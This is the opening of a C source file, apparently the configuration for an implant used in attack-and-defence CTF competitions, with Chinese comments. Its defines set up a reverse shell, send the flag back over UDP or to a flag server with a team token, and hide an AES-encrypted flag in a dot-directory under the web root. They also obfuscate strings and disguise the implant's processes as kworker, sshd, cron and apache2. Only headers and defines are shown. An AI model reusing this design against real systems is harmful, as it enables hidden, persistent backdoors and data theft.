#include <stdio.h>
#include <sys/types.h> 
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <setjmp.h>
#include <sys/time.h>
#include <time.h>
#include "passcode.h"
#define JM_XORSTR_DISABLE_AVX_INTRINSICS
#include "XorString.hpp"
#define GETFLAG 0
#define CURL 1
#define PWN 0
#define WEB 1
#define PROBLEM PWN //修改题目类型（PWN题 UDP反弹；WEB题 写加密文件到web目录）
#define MODE GETFLAG//修改攻击类型（GETFLAG=UDP反弹flag，CURL=提交token）
#define SERVE_FLAG 0                                        //是否监听UDP被动提供flag（1=开启，0=关闭）
#define SERVE_FLAG_PORT 6666                                //被动提供flag的UDP监听端口
#define SIGPARENT 10                                        //选定一个信号作为保活子进程的心跳
#define TOKEN "NSS_TCGXAO"                                  //队伍TOKEN
#define AUTH_SERVER "http://flagserver/flag?token="         //flag server
#define AES_KEY "xia0ji233_wants_"                          //AES 加密密钥
#define AES_IV  "a_girlfriend!!!!"                          //AES 加密初始向量
#define IP "127.0.0.1"                                   //flag反弹的IP
#define FLAG_PORT 9999                                     //flag反弹的端口
#define SHELL_IP "127.0.0.1"                             //shell反弹的IP
#define SHELL_PORT 9999                                    //真实端口将反弹至 SHELL_PORT + index
// #define COM_PORT 23456                                      //PWN通信端口
// #define SECRET "xia0ji233"                                  //密码
#define FLAG_PATH "/flag"                                   //flag路径
#define WWWROOT "/var/www/html/"                            // end of /
#define FLAG_DIR WWWROOT ".xia0ji233/"                      //加密flag存放目录（web不能对外连接时使用）
#define FLAG_FILE FLAG_DIR "flag"                            //加密flag文件路径
#define SHELL_NAME "                               "        //反弹shell的进程名
/* D状态锚点进程的 prctl 短名（≤15字节），显示在 ps 的 comm 列 */
#define ANCHOR_COMM_NAMES { \
    "kworker/u2:0",   \
    "kworker/u4:1",   \
    "kworker/u6:2",   \
}
#define ANCHOR_INNER_COMM "kworker/u8:0"  /* vfork子进程的 comm 名 */
#define FAKE_NAMES { \
    "/usr/sbin/apache2 -k start",  \
    "/usr/sbin/sshd -D",           \
    "/usr/sbin/cron -f",           \
    "/usr/lib/systemd/systemd-logind", \
    "/usr/sbin/rsyslogd -n",       \
    "/usr/bin/dbus-daemon --system", \
    "[kworker/0:1-events]",        \
}
